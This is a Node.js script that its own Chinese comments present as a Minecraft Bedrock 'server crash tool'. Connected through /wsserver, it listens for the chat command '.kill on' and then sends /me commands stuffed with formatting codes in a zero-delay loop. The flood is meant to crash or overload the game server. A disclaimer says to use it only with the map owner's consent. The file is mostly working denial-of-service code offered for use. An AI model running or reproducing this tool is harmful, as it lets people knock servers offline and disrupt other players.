const WebSocket = require('ws');

const PORT = 1145;

let killInterval = null;
let killEnabled = false;


function sendToMinecraft(command) {
    if (!global.mcWebSocket || global.mcWebSocket.readyState !== WebSocket.OPEN) {
        console.log('[错误] Minecraft 未连接');
        return false;
    }
    
    const packet = JSON.stringify({
        header: {
            version: 1,
            requestId: crypto.randomUUID(),
            messageType: "commandRequest",
            messagePurpose: "commandRequest"
        },
        body: {
            commandLine: command.trim(),
            version: 1
        }
    });
    
    global.mcWebSocket.send(packet);
    console.log(`[发送] ${command}`);
    return true;
}


const wss = new WebSocket.Server({ port: PORT });

wss.on('connection', (ws, req) => {
    console.log(`[连接] Minecraft 服务器已接入 (${req.socket.remoteAddress})`);
    
    global.mcWebSocket = ws;
    ws.send(JSON.stringify({
        header: {
            version: 1,
            messagePurpose: "subscribe",
            requestId: crypto.randomUUID()
        },
        body: {
            eventName: "PlayerMessage"
        }
    }));
    
    ws.on('message', (data) => {
        try {
            const parsed = JSON.parse(data.toString());
            
            if (parsed.header?.eventName === "PlayerMessage") {
                const { sender, message, type } = parsed.body;
                
                if (type !== "chat") return;
                
                const msg = message.trim();
                console.log(`[聊天(如有需要可以借由let创建函数在透过布林值来将信息转发)] ${sender}: ${msg}`);
                
                if (msg === '.kill on') {
                    if (killEnabled) {
                        sendToMinecraft(`tellraw ${sender} {"rawtext":[{"text":"§e[系统] 已经在发送中了"}]}`);
                        return;
                    }
                    
                    killEnabled = true;
                    

                    if (killInterval) clearInterval(killInterval);
                    

                    killInterval = setInterval(() => {
                        if (killEnabled && global.mcWebSocket?.readyState === WebSocket.OPEN) {
                            sendToMinecraft(`/me §o§l§m§n§b§c§j§r§l§a§k§h§g§f§d§s§a§p§i§u§t§e§q§1§2§3§4§5§6§7§8§9§0§r§l§o§m§§o§l§m§n§b§c§j§r§l§a§k§h§g§f§d§s§a§p§i§u§t§e§q§1§2§3§4§5§6§7§8§9§0§r`);
                        }
                    }, 0);
                    
                    sendToMinecraft(`FWH©崩服工具已启用,houukhhk无任何责任谢谢`);
                    console.log(``);
                }
                else if (msg === '.kill off') {
                    if (killEnabled) {
                        killEnabled = false;
                        if (killInterval) {
                            clearInterval(killInterval);
                            killInterval = null;
                        }
                        sendToMinecraft(`me FWH©崩服工具已禁用,houukhhk无任何责任谢谢`);
                        console.log(`[系统] 已关闭发送`);
                    } else {
                        sendToMinecraft(`me FWH©崩服工具已经开启状态houukhhk无任何责任谢谢`);
                    }
                }
            }
        } catch (e) {
            //忽略避免报错©houukhhk无任何责任谢谢
        }
    });
    
    ws.on('close', () => {
        console.log('[断开] Minecraft 服务器断开连接');
        global.mcWebSocket = null;
        if (killInterval) {
            clearInterval(killInterval);
            killInterval = null;
        }
        killEnabled = false;
    });
    
    ws.on('error', (err) => {
        console.error('[错误] WebSocket 错误:', err.message);
    });
});

console.log(`.kill on/off `);
console.log(`在minecraft输入wsserver localhost:${PORT}`);
//©FWH by houukhhk无任何责任谢谢
//在经过地图主人同意才能崩服，未经同意擅自崩服可能会导致xbox账号遭到封锁...，否则后果自负！
